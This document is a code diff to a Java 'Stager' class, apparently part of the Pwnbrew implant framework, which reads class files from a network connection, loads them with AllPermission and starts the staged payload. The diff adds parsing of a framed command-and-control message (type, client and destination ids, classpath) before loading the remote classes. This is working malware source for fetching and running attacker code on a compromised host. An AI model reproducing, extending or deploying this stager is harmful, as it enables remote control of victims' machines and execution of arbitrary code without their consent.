@@ -94,6 +94,7 @@ public class Stager extends ClassLoader {
         OutputStream theOS = null;
         String decodedURL = null;
         
+        byte[] clientId = null;
         String theURL = localProperties.getProperty("U", null);
         if (theURL != null){
 
@@ -119,6 +120,7 @@ public class Stager extends ClassLoader {
                     
                     //Get the input stream
                     theIS = aTimer.getInputStream();
+                    clientId = aTimer.getClientId();
                     
                 } else {
                     uninstall();
@@ -135,7 +137,8 @@ public class Stager extends ClassLoader {
             return;
         }
     
-        new Stager().start(theIS, theOS, decodedURL );
+        Stager theStager = new Stager();
+        theStager.start(theIS, theOS, decodedURL, clientId );
 
     }
 
@@ -240,33 +243,77 @@ public class Stager extends ClassLoader {
      * @param paramArrayOfString
      * @throws Exception 
      */
-    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL ) {
+    private void start(InputStream paramInputStream, OutputStream paramOutputStream, String passedURL, byte[] clientId ) {
         
         try {
             
+            //Prune of the unnecessary data
             DataInputStream localDataInputStream = new DataInputStream(paramInputStream);
-            Permissions localPermissions = new Permissions();
-            localPermissions.add(new AllPermission());
-            ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
-            Class localClass;
-            
-            int classLength = localDataInputStream.readInt();
-            do {
-                byte[] arrayOfByte = new byte[classLength];
-                localDataInputStream.readFully(arrayOfByte);
-                resolveClass(localClass = defineClass(null, arrayOfByte, 0, classLength, localProtectionDomain));
-                classLength = localDataInputStream.readInt();
-            }
-            while (classLength > 0);            
-            
+            byte msgType = (byte)(localDataInputStream.read() & 0xff );
+            if( msgType == 88 ){
 
-            //Start staged class
-            Object pwnbrewStage = localClass.newInstance();
-            String[] theObjArr = new String[]{passedURL};
-            
-            Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
-            aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
-            
+                //Skip the message length
+                byte[] msglenArr = new byte[4];
+                localDataInputStream.read(msglenArr);
+//                localDataInputStream.skipBytes(2);
+                
+                //Skip the client id
+                byte[] cltId = new byte[4];
+                localDataInputStream.read(cltId);
+//                localDataInputStream.skipBytes(4);
+                
+                //Get the dest ID
+                byte[] dstId = new byte[4];
+                localDataInputStream.read(dstId);
+                    
+                    //Skip the msg id
+                    localDataInputStream.skipBytes(4);
+                    
+                    //Get the classpath length
+                    byte[] clsLen = new byte[2];
+                    localDataInputStream.read(clsLen);
+                    
+                    //Convert to int
+                    int tempInt = 0;
+                    tempInt += (clsLen[0] & 0xff) << (8 * 1);
+                    tempInt += (clsLen[1] & 0xff);
+                    
+                    //Skip the classpath
+                    localDataInputStream.skipBytes(tempInt);
+                    
+                    //Get the type
+                    msgType = (byte)(localDataInputStream.read() & 0xff );
+                    if( msgType == 32 ){
+                        
+                        //Get the payload length
+                        byte[] payLen = new byte[4];
+                        localDataInputStream.read(payLen);
+                
+                        //Get the payload
+                        Permissions localPermissions = new Permissions();
+                        localPermissions.add(new AllPermission());
+                        ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
+                        Class localClass;
+
+                        int classLength = localDataInputStream.readInt();
+                        do {
+                            byte[] arrayOfByte = new byte[classLength];
+                            localDataInputStream.readFully(arrayOfByte);
+                            resolveClass(localClass = defineClass(null, arrayOfByte, 0, classLength, localProtectionDomain));
+                            classLength = localDataInputStream.readInt();
+                        }
+                        while (classLength > 0);            
+
+
+                        //Start staged class
+                        Object pwnbrewStage = localClass.newInstance();
+                        String[] theObjArr = new String[]{passedURL};
+
+                        Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
+                        aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
+                    }   
+            }
+        
         } catch (Throwable localThrowable) {
             
             //Write to the byte stream then send back
@@ -287,6 +334,22 @@ public class Stager extends ClassLoader {
             }
         }
         
+    }
+    
+     //===============================================================
+    /**
+     * 
+     * @param value
+     * @return 
+     */
+    public static int byteArrayToInt(byte[] value){
+
+        int tempInt = 0;
+        for(int i = 0, j = value.length; i < value.length; i++, j-- ){
+            tempInt += (value[i] & 0xff) << (8 * (j - 1));
+        }
+        return tempInt;
+
     }
 
 }
